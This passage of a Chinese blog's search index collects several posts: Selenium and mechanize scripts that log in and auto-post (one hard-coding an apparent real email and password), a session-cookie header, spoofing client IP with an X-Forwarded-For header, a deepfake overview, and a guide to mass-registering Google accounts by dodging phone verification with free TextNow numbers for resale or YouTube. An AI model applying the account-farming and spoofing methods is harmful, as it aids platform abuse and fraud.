name_label.clear() name_label.send_keys(name) pwd_label = chrome.find_element_by_id("id_password_l") pwd_label.clear() pwd_label.send_keys(pwd) time.sleep(5) login_label = chrome.find_element_by_id("login_btn") login_label.click() time.sleep(15) chrome.close()if __name__ == "__main__": name = "helloyiwantong@163.com" pwd = "helloyiwantong@1234" url = "http://www.maiziedu.com/" automatic_login(name,pwd,url)python automatic login 五、控制多窗口1234567891011121314151617181920212223242526272829&gt;&gt;&gt; frome selenium import webdrive&gt;&gt;&gt; chrome = webdrive.Chrome()&gt;&gt;&gt; chrome.get("https://www.baidu.come")&gt;&gt;&gt; chrome.find_element_by_id("kw").send_keys("红花")&gt;&gt;&gt; chrome.find_element_by_id("su").click() # 打开百度搜索的第一个窗口&gt;&gt;&gt; chrome.find_element_by_partial_link_text("百度百科").click() # 打开第二个窗口&gt;&gt;&gt; chrome.find_element_by_partial_link_text("中药").click() # 打开第三个窗口&gt;&gt;&gt; chrome.window_handles # 查看当前 打开窗口['CDwindow-D41F1F3BF5038E36E91EA7F7E7E9770D','CDwindow-F2D1553323BDC39BE99DBF280804FCCC','CDwindow-B41B29B8A7CB49BF191E46FF936E6A52',]&gt;&gt;&gt; chrome.switch_to_window(chrome.window_handles[1]) # 使用索引切换到第二个窗&gt;&gt;&gt; chrome.current_url() # 查看当前url 六、模拟用户自动登录1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from selenium import webdriverimport timefrom selenium.webdriver.support.ui import WebDriverWaitdef wait_response_time(chrome,waittime,func): # 返回 func执行结果 return WebDriverWait(chrome,waittime).until(func)def automatic_login(name,pwd,url): chrome = webdriver.Chrome() chrome.get(url) time.sleep(2) chrome.maximize_window() # time.sleep(2) # chrome.find_element_by_xpath("/html/body/div[3]/div[2]/div[3]/div/div").click() ############## 第二种方法 设置时间延迟 # login_btn_lable = wait_response_time(chrome,5, # lambda chrome: chrome.find_element_by_xpath("/html/body/div[3]/div[2]/div[3]/div/div")) # login_btn_lable.click() ## 利用函数设置等待响应时间 chrome.find_element_by_link_text("登录").click() time.sleep(1) name_label = chrome.find_element_by_id("id_account_l") name_label.send_keys(" ") # 防止发送不成功 name_label.clear() name_label.send_keys(name) pwd_label = chrome.find_element_by_id("id_password_l") pwd_label.clear() pwd_label.send_keys(pwd) time.sleep(5) login_label = chrome.find_element_by_id("login_btn") login_label.click() error_id="login-form-tips" error_message=chrome.find_element_by_id(error_id) err=error_message.text print(error_message,type(error_message)) print(err) # time.sleep(10) # chrome.close()if __name__ == "__main__": name = "helloyiwantong@163.com" pwd = "helloyiwantong@134" url = "http://www.maiziedu.com/" automatic_login(name,pwd,url)automatic login 七、模拟用户自动登录 封装接口1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from selenium import webdriverimport timefrom selenium.webdriver.support.ui import WebDriverWaitdef open_browse(): """ open browser obj :return: """ browse_obj = webdriver.Chrome() return browse_objdef click_url_and_clicl_loginbtn(browse,url): """ open url and click "登录" btn :param browse: :param url: :return: """ browse.get(url) browse.maximize_window() loginbtn_lable=browse.find_element_by_link_text("登录") loginbtn_lable.click() time.sleep(1)def get_element_label(browse,element_id_dict): """ get element lable :param browse: :param element_id_dict: :return: """ user_label = browse.find_element_by_id(element_id_dict["name"]) pwd_label = browse.find_element_by_id(element_id_dict.get("pwd")) login_label = browse.find_element_by_id(element_id_dict.get("login")) return (user_label,pwd_label,login_label)def send_key_s(lable_tuple,userinfo_dict,userinfo_list): """ send userinfo and logian :param lable_tuple: :param userinfo_dict: :param userinfo_list: :return: """ i=0 if i&lt;=1: for key in userinfo_list: # lable_tuple[i].send_keys(" ") # lable_tuple[i].click() lable_tuple[i].send_keys(userinfo_dict.get(key)) i+=1 time.sleep(1) lable_tuple[2].click()### 封装数据url = "http://www.maiziedu.com/"id_dict = &#123; "name":"id_account_l", "pwd" : "id_password_l", "login":"login_btn",&#125;userinfo_dict=&#123; "name" : "helloyiwantong@163.com", "pwd" : "helloyiwantong@1234", "url" : "http://www.maiziedu.com/",&#125;# 函数使用userinfo_list =["name","pwd"]chrome = open_browse()click_url_and_clicl_loginbtn(chrome,url)lable_tuple = get_element_label(chrome,id_dict)send_key_s(lable_tuple,userinfo_dict,userinfo_list)automatic login 更多参考: https://www.cnblogs.com/hellosecretgarden/p/9206648.html 经典参考文档: https://blog.csdn.net/u010986776/article/details/79266448 https://blog.csdn.net/Yeoman92/article/details/83105318 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mechanize 使用实例]]></title>
    <url>%2F2018%2F02%2F01%2F32_mechanize%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[Mechanize 不支持JavaScriptSelenium 是一套完整的Web应用程序测试系统我们可以选用一款支持JavaScript的模块-Selenium. 简介：Mechanize 是一个 Python 模块，用于模拟浏览器。由于考虑到爬虫所需要的是数据，所以该模块完全可以绕过验证码，直接使用 Cookie 登录就可以了。但是 Mechanize 模块使用 Cookie 登录，Cookie 的生存期较短，而且该模块也不支持 JavaScript。总体来说，该模块在面对验证码问题，算是个非常好的办法，应推荐使用。 官网:http://wwwsearch.sourceforge.net/mechanize/Mechanize&amp;Selenium参考:http://blog.csdn.net/u011974639/article/details/73148949 QQ群：397745473 使用方法一123456789101112131415161718192021222324252627282930313233import mechanize #导入模块br = mechanize.Browser()br.set_handle_equiv(True)br.set_handle_redirect(True)br.set_handle_referer(True)br.set_handle_robots(False)br.set_handle_gzip(False)br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)header = [('Cookie', 'PHPSESSID=11eb50f5bec637ec3506307daf1e02ea; ECS_ID=ef9ff8c13f0c4215c7935da16a7b206ca03c44fa; bdshare_firstime=1484752989129; Hm_lvt_6424edc88ffc5606738fadb6f51be89f=1484574708,1484752969; Hm_lpvt_6424edc88ffc5606738fadb6f51be89f=1484757613'), ('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/55.0.2883.87 Chrome/55.0.2883.87 Safari/537.36')] #获取用户登录百度后的Request Headers里面的Cookie值 和 User-Agent，#其中，Cookie含有账号和密码信息，User-Agent是说明该请求是浏览器请求的，不是网络爬虫。#需要注意的是，这些Cookie和User-Agent值，根据自己的情况去设置br.addheaders = getHeaders(header)#以上都是初始化操作，下面正式操作br.open('https://www.baidu.com') #打开百度result = br.response().read() #输出该网页的代码内容，#若接触过BeautifulSoup，可以将获得的 result 网页内容,用于以下方法处理：soup = BeautifulSoup(result,'lxml')#剩下的，可以用 BeautifulSoup的知识去解决了#在安装好必要的模块后，以上代码可以直接拿过来使用 使用方法二Mechanize模拟浏览器还有其他一些操作，如下12for form in br.forms(): print(form) 输出结果如下：123456789101112131415&lt;f GET https://www.baidu.com/s application/x-www-form-urlencoded &lt;HiddenControl(ie=utf-8) (readonly)&gt; &lt;HiddenControl(f=8) (readonly)&gt; &lt;HiddenControl(rsv_bp=1) (readonly)&gt; &lt;HiddenControl(rsv_idx=1) (readonly)&gt; &lt;HiddenControl(ch=) (readonly)&gt; &lt;HiddenControl(tn=baidu) (readonly)&gt; &lt;HiddenControl(bar=) (readonly)&gt; &lt;TextControl(wd=)&gt; &lt;SubmitControl(&lt;None&gt;=百度一下) (readonly)&gt; &lt;HiddenControl(rn=) (readonly)&gt; &lt;HiddenControl(oq=) (readonly)&gt; &lt;HiddenControl(rsv_pq=8e85a2600001382e) (readonly)&gt; &lt;HiddenControl(rsv_t=e2292vaXa6IOboaARHGB3ajcHkUM/7/UPf2NufNR+ninqHO+83EQ8YY76sg) (readonly)&gt; &lt;HiddenControl(rqlang=cn) (readonly)&gt;&gt; 从输出的结果可以看出，其中&lt; HiddenControl(f=8) (readonly) &gt;是以 名字为 f 的框架（有时候框架没有名字，那就只能使用它们的顺序来选择）；输入文字的位置为文本输入框 &lt; TextControl(wd=) &gt;。选择框架，在框架内输入数据后提交数据。以搜索“Python 网络爬虫” 为例，123456br.select_form(name=&apos;f&apos;)br.form[&apos;wd&apos;] = &apos;Python 网络爬虫&apos;br.submit() # 提交result = br.response().read() #输出结果，可以将结果用BeautifulSoup来处理，即soup = BeautifulSoup(result,&apos;lxml&apos;)，然后提取想要的数据 使用方法三查看返回页面的链接，例如：12for link in br.links(): print(&quot;%s : %s&quot; %(link.url,link.text)) 使用方法四使用mechanize浏览器打开指定链接，例如： newLink = br.click_link(text=’自己动手写网络爬虫’) br.open(newLink) Python：mechanize模拟浏览器行为Python有许许多多有趣的模块，每当自己需要解决某个问题的时候，Python总能冒出来一两个让你惊喜的小玩意。比如说用于数值计算的Numpy（强大而方便的矩阵能力），用于数据分析的Pandas（和R语言有非常多相似的功能，在读写各种文件以及数据处理上会让人有种把excel、R、机器学习融合起来使用的感觉），用于爬虫内容提取的BeautifulSoup（点对点的精准数据获取，使用非常方便），以及最近正在使用的用于模拟浏览器登录的Mechanize。 业务需求既谈技术，先明需求，学习Mechanize的真实目的不方便描述，以下是学Mechanize带来的福利。 现有一论坛，由于某种特殊原因需要定时发帖。比如一些校园内网的BBS，如果想浏览帖子，必须先登录。也就是说现在需要一个工具，能够登录该论坛，然后在相应的文本输入框中输入汉字，最后提交。 其实原理就是模拟浏览器和Server交互的一个过程，主要在于协议的一些理解。经过一些调研，有两种方案可选：Java的HttpClient和Python的Mechanize。两者都可实现模拟浏览器进行交互的一些功能，实现难度都不大。 HttpClient的方便之处在于文档比较全，还可以直接看源码，官网（https://hc.apache.org/index.html）还有各种小例子，有些可以直接使用。目前最新版本是4.5。 Mechanize使用比较简单，它保留许多与出色的 Expect 脚本相同的东西，它的使用过程，比如.select_form()、.submit()、.follow_link()等方法确实比较还原真实的“查找并发送”操作。遗憾的是文档并不想网上说的那么详细，官方给了几个例子，但是没有像Java那样的API，好多方法需要自己来摸索和看网上的例子，在使用的时候想查看所有的方法介绍比较麻烦。但是这不能阻挡我使用它的决心。Mechanize很久没更新了，目前版本是0.2.5。官网：http://wwwsearch.sourceforge.net/mechanize/ Mechanize介绍mechanize是对urllib2的部分功能的替换，能够更好的模拟浏览器行为，在Web访问控制方面做得更全面。它对protocol, cookie, redirection都做了比较好的支持，再结合beautifulsoup和re模块，可以非常有效的解析web页面。 常用函数.CookieJar()：设置cookie.Browser()：打开浏览器.addheaders()：User-Agent，用来欺骗服务器的.open()：打开网页，按照官网描述可以打开任意网页，不仅限于http.select_form()：选择表单的，选择表单的ID的时候需要注意。.form[]：填写信息.submit()：提交 从百度搜索比较简单，先获取表单信息，然后填入相应信息，提交即可，最后查看返回信息 1234567891011121314151617181920212223242526272829303132333435363738394041import sysimport mechanize#Browserbr = mechanize.Browser()#optionsbr.set_handle_equiv(True)#br.set_handle_gzip(True)br.set_handle_redirect(True)br.set_handle_referer(True)br.set_handle_robots(False)#Follows refresh 0 but not hangs on refresh &gt; 0br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)br.set_debug_http(True)br.set_debug_redirects(True)br.set_debug_responses(True)#欺骗行为br.addheaders = [(&apos;User-agent&apos;, &apos;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1&apos;)]#上面的代码主要用于初始化设置，最好设置一下# 打开百度r = br.open(&apos;https://www.baidu.com/&apos;)#获取百度的表单，从中找到输入汉字的位置for f in br.forms(): print fbr.select_form(nr = 0)#搜索关键字“火车”br.form[&apos;wd&apos;] = &quot;火车&quot;br.submit()# 查看搜索结果brr=br.response().read()#是html代码，能看到火车的搜索结果print brr 登录某论坛，并发贴比如http://examplehome.com论坛，需要在该论坛的http://examplehome.com/ID=001的帖子里面回复。大体流程如下： 先登录http://examplehome.com/login界面，启用cookie记录，记录cookie信息。登录界面之后，cookie中已保存了登录信息，获取该cookie信息，再打开http://examplehome.com/ID=001，获取表单信息。在相应位置填入信息，提交，最后查看结果。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import sysimport mechanize#cookiecj = mechanize.CookieJar()#Browserbr = mechanize.Browser()#optionsbr.set_handle_equiv(True)#br.set_handle_gzip(True)br.set_handle_redirect(True)br.set_handle_referer(True)br.set_handle_robots(False)#Follows refresh 0 but not hangs on refresh &gt; 0br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)#debugging?br.set_debug_http(True)br.set_debug_redirects(True)br.set_debug_responses(True)#User-Agent (this is cheating, ok?)br.addheaders = [(&apos;User-agent&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36&apos;)]#启用cookiebr.set_cookiejar(cj)br.open(&quot;http://examplehome.com/login&quot;)#print br.title()br.select_form(nr = 0)#获取表单信息，我已知道信息，故注释掉#for f in br.forms(): #print f#account infobr.form[&apos;username&apos;] = &quot;name&quot;br.form[&apos;password&apos;] = &apos;pawd&apos;br.submit()#登录成功，查看登录成功的后的信息#br_response = br.response().read()#print br_response#经过上面步骤，cookie里已经保存的登录信息，下面直接使用cookie即可免密码登录了#Browserbr2 = mechanize.Browser()#optionsbr2.set_handle_equiv(True)#br.set_handle_gzip(True)br2.set_handle_redirect(True)br2.set_handle_referer(True)br2.set_handle_robots(False)#Follows refresh 0 but not hangs on refresh &gt; 0br2.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)#debugging?br2.set_debug_http(True)br2.set_debug_redirects(True)br2.set_debug_responses(True)#User-Agent (this is cheating, ok?)br2.addheaders = [(&apos;User-agent&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36&apos;)]#设置 cookiebr2.set_cookiejar(cj)#打开帖子的链接r = br2.open(&quot;http://examplehome.com/ID=001&quot;)br2.select_form(nr = 3)#获取表单的信息#for f in br2.forms():# print f#在发帖处，填写回复内容br2.form[&apos;message&apos;] = &quot;我是使用程序自动发帖的~&quot;br2.submit()#查看发帖后的结果br2_response = br2.response().read()print br2_response 12345678910111213141516171819202122232425262728293031323334353637import reimport mechanizebr = mechanize.Browser()br.open("http://www.example.com/")# follow second link with element text matching regular expressionresponse1 = br.follow_link(text_regex=r"cheese\s*shop", nr=1)assert br.viewing_html()print br.title()print response1.geturl()print response1.info() # headersprint response1.read() # bodybr.select_form(name="order")# Browser passes through unknown attributes (including methods)# to the selected HTMLForm.br["cheeses"] = ["mozzarella", "caerphilly"] # (the method here is __setitem__)# Submit current form. Browser calls .close() on the current response on# navigation, so this closes response1response2 = br.submit()# print currently selected form (don't call .submit() on this, use br.submit())print br.formresponse3 = br.back() # back to cheese shop (same data as response1)# the history mechanism returns cached response objects# we can still use the response, even though it was .close()dresponse3.get_data() # like .seek(0) followed by .read()response4 = br.reload() # fetches from serverfor form in br.forms():print form# .links() optionally accepts the keyword args of .follow_/.find_link()for link in br.links(url_regex="python.org"):print link br.follow_link(link) # takes EITHER Link instance OR keyword args br.back()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>mechanize</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用火狐浏览器伪造IP地址]]></title>
    <url>%2F2018%2F02%2F01%2F33_%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%AA%E9%80%A0IP%E5%9C%B0%E5%9D%80%2F</url>
    <content type="text"><![CDATA[对于浏览器来讲小伙伴们肯定再熟悉不过了，浏览器是咱们居家旅行、访问网站之必用装备。有童鞋说了，杜克你聊得别的呗，浏览器谁不会用啊，还用你教呢？既然这样，那我就来给大家来点你所不懂的 – 伪造自己的IP地址！ QQ群：397745473 工具/原料 火狐浏览器 Modify Headers 方法/步骤 安装插件：先打开火狐浏览器 =&gt; 找到下载好的 modify_headers.xpi插件文件 =&gt; 鼠标按住插件文件不放，拖拽到火狐浏览器界面 =&gt; 按提示重启浏览器=&gt; 完成安装。在浏览器右上角点小图标，选择打开“Open ModifyHeaders”，如下图所示 如图依次选择 Add → 输入 X-Forwarded-For → 自定义IP地址 → 点Add按钮完成添加 → 最后点击左上角的“Start”开启插件就搞定啦！ 测试效果关闭插件配置小窗口，我们打开 www.ip138.com ，看到了嘛，自己的IP已经显示为刚刚自定义“伪造”的IP地址咧… 总结和思考由此可见:通过手动修改 HTTP请求头（X-Forwarded-For）的方式，就可以轻易骗过服务器，达到所谓的“伪造”客户端IP地址的目的，当然这招并非对于所有的网站有效（这取决于服务器获取ClientIP的方式），比如百度搜索IP所显示的IP还是你的真实IP。同时举一反三对于网站管理员来讲，任何客户端发送的请求数据都是不可信的，想象一下，如果自定义的X-Forwarded-For值中含有敏感字符，甚至可以导致SQL注入的后果。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python实现视频人脸替换]]></title>
    <url>%2F2018%2F02%2F01%2F34_python%E4%BA%BA%E8%84%B8%E6%9B%BF%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[QQ群：397745473很多人在朋友圈中发照片，都喜欢把自己PS得漂亮或帅气一点，所以美颜相机大行其道。如果是旧的纸质照片，除了一些会PS技术的人，普通人很难把原照片PS得更好一点。如果是视频里的你，就算是PS大神也很难给你换一张脸。你有想过吗？如果把明星演的电影，好比把里边的主角范冰冰的脸换成你的，是一张你的会动会有表情的脸，那你会如何想呢？ 最近一有个python的人工智能项目很火，就是给视频人物换脸。代码地址在： https://github.com/joshua-wu/deepfakes_faceswap/。 这款软件需要的软件环境列表如下： Python 3 Opencv 3 Tensorflow 1.3+(?) Keras 2 硬件环境是要有一个CUDA支持的显卡。一切软硬件就序后，运行： python train.py 就可以了。该项目同时还提供了约600mb的训练素材。 该项目在reddit的deepfakes社区里讨论得很火热。我翻了一下，找到一张有趣的中国人的评论，希望把视频人物换成angelbaby的脸。该项目的原理大体如下： 1、将视频拆成N个框架，每个框架里放一张图片。 2、将需要替换的脸从图片里挖出来，然后训练成256x256的标准格式。 3、用训练好的脸部模型，完成对第二步产生的标准格式的脸部替换。 4、替换好的脸部，替换回每个框架里的图像。 5、将处理好的框架合并成视频。 由于我对人工智能的python代码不精通，所以我没做测试。我抓了两张他们做完的视频的几张图，你们看下自不自然。 这两个人都是好莱坞的明星，原谅我不认识。另外，为什么图我只抓头呢？其实你也明白的，这些程序员用了这份程序做了些什么事，好色之心，人皆有之，程序员也不例外，所以我没法抓全身图了。 现在这份技术，原作者也说并不成熟，做出的视频还是有些不自然。我就想，如果这个技术成熟了，视频也能造假了，想想真可怕。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xshell 将远程端口映射到本地]]></title>
    <url>%2F2018%2F02%2F01%2F35_xshell%E5%B0%86%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%88%B0%E6%9C%AC%E5%9C%B0%2F</url>
    <content type="text"><![CDATA[QQ群：397745473 看两个图完全就明白了怎么回事]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>xshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[selenium环境配置Firefox和Chrome]]></title>
    <url>%2F2018%2F01%2F31%2F28_selenium%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AEFirefox%E5%92%8CChrome%2F</url>
    <content type="text"><![CDATA[Selenium 是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Mozilla Firefox，Safari，Google Chrome，Opera等。这个工具的主要功能包括：测试与浏览器的兼容性——测试你的应用程序看是否能够很好得工作在不同浏览器和操作系统之上。测试系统功能——创建回归测试检验软件功能和用户需求。支持自动录制动作和自动生成 .Net、Java、Perl等不同语言的测试脚本。 selenium 环境配置 Firefox和Chrome QQ群：397745473 准备1.下载Selenium库pip install selenium 官网地址:https://pypi.python.org/pypi/selenium/ 2.下载驱动Chrome: https://sites.google.com/a/chromium.org/chromedriver/downloadsFirefox: https://github.com/mozilla/geckodriver/releases注意:1.直接下载对应的版本,放到python.exe的同级目录中,否则就需要将chrome和firefox的.exe路径和驱动路径均加入path环境变量中.2.需要把浏览器升级到最新版本,否则会报错. 参考:1.Python - Selenium Chrome 模拟手机http://blog.csdn.net/max229max/article/details/70807918 2.Python selenium —— 用chrome的Mobile emulation模拟手机浏览器测试手机网页http://blog.csdn.net/huilan_same/article/details/52856200 测试调用Chromefrom selenium import webdriver browser = webdriver.Chrome() browser.get(&apos;http://baidu.com&apos;) Chromefrom selenium import webdriver from bs4 import BeautifulSoup from selenium.webdriver.common.keys import Keys browser= webdriver.PhantomJS() browser.get(&quot;https://baike.baidu.com/&quot;) browser.find_element_by_tag_name(&quot;input&quot;).send_keys(&quot;Python&quot;) browser.find_element_by_tag_name(&quot;button&quot;).click() soup = BeautifulSoup(browser.page_source, &quot;html.parser&quot;) print (soup.prettify()) browser.quit() 知识扩展1.在headless模式下运行seleniumhttps://segmentfault.com/a/1190000009081206]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vksec 操作记录]]></title>
    <url>%2F2018%2F01%2F29%2F23_vksec_%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[本文用作记录，vksec 操作记录QQ群：397745473 vksec 操作记录server : 172.16.1.48path: /blog/source/_posts本地: D:\用户目录\Desktop\source 1.将编辑好的md文件上传到path中。 2.执行生成并上传:12cd /blog/source/_posts;rzcd /blog &amp;&amp; hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy 使用的图床： https://imgur.com/ https://vksec.imgur.com/all Instagram賺錢2019 | 如何沒有粉絲也能在Instagram賺錢 ？？： https://www.youtube.com/watch?v=ZPKtQ82h42c 免費圖片設計平台： https://www.canva.com 每次寫英語文章都必用的改錯工具 Grammarly（免費） ‣‣ https://grammarly.go2cloud.org/SH1tu 查出QQ列表不在某群中 1select * from myQQList where account not in (select uin from groupInfo where gc = 群号) 参考: http://baixin.io/2015/08/HEXO%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/ https://www.jianshu.com/p/465830080ea9 http://blog.csdn.net/u014230646/article/details/51852695]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pyqt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[eukhost 性价比高/17.95美元一年/512MB内存/15GB硬盘/3TB流量/1Gbps/KVM/洛杉矶MC机房/三网都还算好]]></title>
    <url>%2F2018%2F01%2F29%2F24_vps%E6%8E%A8%E8%8D%90001%2F</url>
    <content type="text"><![CDATA[eukhost 算是一家比较新的商家，但他们的技术实力我看并不差，在我自己购买了一台他们的VPS之后观察了几个月来看，算是非常的稳定了，基本就没见离线过。这家的控制面板也比较奇葩点，支持按小时计费，且能随意提升配置。免费提供rDNS功能与AnyCast DNS的使用。当然，我更看重的是他们支持以每个月2美元的价格加一个由Voxility提供防护的DDOS高防IP。当然了，可能价格他们不是最低的，但我觉得VPS这种东西稳定是最重要的，谁也不想天天发工单去抗议吧。烦不烦呢。QQ群：397745473 vps测试测试IP：173.82.2.222测试文件：100MB vps推荐 DEC-17-512CPU: 1核 内存: 512MB 硬盘: 15GB RAID10 HDD 网络: 3TB/1Gbps 架构: KVM 机房: MultaCom 洛杉矶 价格：17.95美元一年（0.00201美元一小时） 购买链接 KVM-299CPU: 1核 内存: 1024MB 硬盘: 30GB RAID10 HDD 网络: 3TB/1Gbps 架构: KVM 机房: MultaCom 洛杉矶 价格：2.99美元一个月（0.00402美元一小时） 购买链接 KVM-599CPU: 2核 内存: 2048MB 硬盘: 60GB RAID10 HDD 网络: 3TB/1Gbps 架构: KVM 机房: MultaCom 洛杉矶 价格：5.99美元一个月（0.00805美元一小时） 购买链接 QQ群：397745473]]></content>
      <categories>
        <category>vps推荐</category>
      </categories>
      <tags>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[将Facebook Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入！]]></title>
    <url>%2F2018%2F01%2F29%2F25_%E5%B0%86Facebook_Messenger%E5%8A%A0%E5%85%A5%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E7%9B%B4%E6%8E%A5%E5%92%8C%E5%AE%A2%E6%88%B7%E8%81%8A%E5%A4%A9%E6%8F%90%E9%AB%98%E8%BD%AC%E6%8D%A2%E7%8E%87%E5%A2%9E%E5%8A%A0%E9%94%80%E5%94%AE%E6%94%B6%E5%85%A5%2F</url>
    <content type="text"><![CDATA[将Facebook Messenger加入你的网站，直接和客户聊天提高转换率增加销售收入！QQ群：397745473 如要制作Facebook Messenger 按钮，先进入这个网站：https://www.modernapp.co/app/bonus步骤如下：(1) 输入你的Facebook专页 URL(2) 输入按钮上的字句，例如：给我讯息(3) 选取按钮设计(4) 最后复制程序代码放入网站你想要的位置大家马上动手做起来吧，观察Facebook Messenger对你网站的转换率有没帮助，然后留言告诉我们你的想法，欢迎大家多多交流。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pyqt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[奇技淫巧：手工注册大量google账号的方法]]></title>
    <url>%2F2018%2F01%2F29%2F26_%E5%A4%A7%E9%87%8F%E6%B3%A8%E5%86%8Cgmail%E8%B4%A6%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[奇技淫巧：手工注册大量google账号的方法QQ群：397745473 第一种方式很简单用火狐阅读器安装插件User Agent Switcher挑选： 然后翻开google注册账号就行了 1https://accounts.google.com/SignUp?continue=http%3A%2F%2Fwww.google.com.hk%2F%3Fzx%3D1389151939&amp;btmpl=mobile_tier2&amp;hl=en 第二种方式 有点复杂转载他人的首先登陆gmail注册页面： 1https://accounts.google.com/SignUp?service=mail&amp;continue=http%3A%2F%2Fmail.google.com%2Fmail%2F&lt;mpl=default&amp;hl=en]https://accounts.google.com/SignUp?service=mail&amp;continue=http%3A%2F%2Fmail.google.com%2Fmail%2F&lt;mpl=default&amp;hl=en 依次输入 姓名、用户名邮箱、密码、确认密码、生日、性别) 到这没有难度，接下来： 点击下一步，进入认证界面： 翻开网站：https://www.textnow.com/，先注册一个账户，首页即有注册页面，注册信息比力简单：然后登陆：回到gmail注册页面，输入电话号码： 接着回到网站：https://www.textnow.com/，可以看见收到考证码了：回到谷歌考证页面，输入考证码：到此为止就完成了，可以去设备账户了，呵呵 第三种方式这个办法是在TGL看到的，以前我批量注册google账号做youtube的时候也用过免费短信服务站textnow.com，用的最多的地区码是567，可是用了一段时间后开始发现经常性的收不到google的验证短信，于是换地区码，偶尔能收到，又过了一段时间，终于就什么都收不到了。于是没法，在淘宝买了几十账号继续做，直到今天看到的这个方法，真是让人眼前一亮，原来这样变通一下就可以成功了。 具体是这样：步骤一，在textnow.com注册账号，获得免费的美国电话号码（注册的时候要用国外IP，邮箱不能用QQ邮箱，推荐用10分钟邮箱 (10minutemail.com）。 步骤二，在google注册的时候，不能选择用短信接收验证号码，要选择用语音接收验证码。提交之后google就会拨打你所填写的美国电话号码，你在textnow.com的网站界面会看到来电通知，点击接听就好了，会听到自动语音播报验证码，会播报两次，你照着填就好了。 不管你是和我一样做youtube，还是卖gmail邮箱，一切就这么简单的搞定，这方法简直就是给你送钱。 另外需要注意的是有的朋友注册textnow.com会出现提示 “Something went wrong with your signup. Please try again!”， 这个主要是因为IP被封造成的，换个IP就可以了。 还有就是有人说接不到电话这个方法是骗人的，其实是因为你根本没动脑子，在textnow.com后台，进入Settings-Advanced，高级设置里选择“Calling Alpha：Enable the alpha TextNow.com calling feature on this browser”，就可以了。 QQ群：397745473]]></content>
      <categories>
        <category>gmail</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>gmail</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[excel随机生成密码]]></title>
    <url>%2F2018%2F01%2F29%2F27_excel%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[excel随机生成密码QQ群：397745473 大小写字母和数字混合的密码1=CONCATENATE(CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RAND()*9+48,RAND()*25+65,RAND()*25+97))),CHAR(INT(CHOOSE(INT(RAND()*2.999+1),RA